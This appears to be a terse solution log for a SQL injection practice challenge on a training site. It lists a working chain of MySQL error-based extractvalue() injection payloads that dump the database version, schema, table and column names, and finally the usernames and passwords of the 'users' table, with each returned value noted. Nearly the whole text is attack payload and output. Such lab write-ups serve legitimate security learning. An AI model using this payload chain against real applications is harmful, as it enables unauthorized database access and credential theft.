http://leettime.net/sqlninja.com/tasks/xpath_ch1.php?id=1

id=1))--+

order by 1
-- found only 1 column

and extractvalue(0x0a,concat(0x0a,(select 1)))
--column 1 visible

and extractvalue(0x0a,concat(0x0a,(select version())))
--5.6.47-cll-lve

and extractvalue(0x0a,concat(0x0a,(select database())))
--leettime_761wHole


and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))
--testtable1
--userlogs
--users

and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name ='users' limit 0,1)))

-- id
-- username
-- password
-- user_type
-- sec_code


and extractvalue(0x0a,concat(0x0a,(select group_concat(username,0x09,password,0x0a) from (select username,password from users limit 0,10)a)))

 --injector khan
 --decompiler hacktract
 --devilhunte dante
 --Zen sec-idiots
 --Zenodermus security-i
 --grayhat hacker
 --khan haxor
 --admin sadmin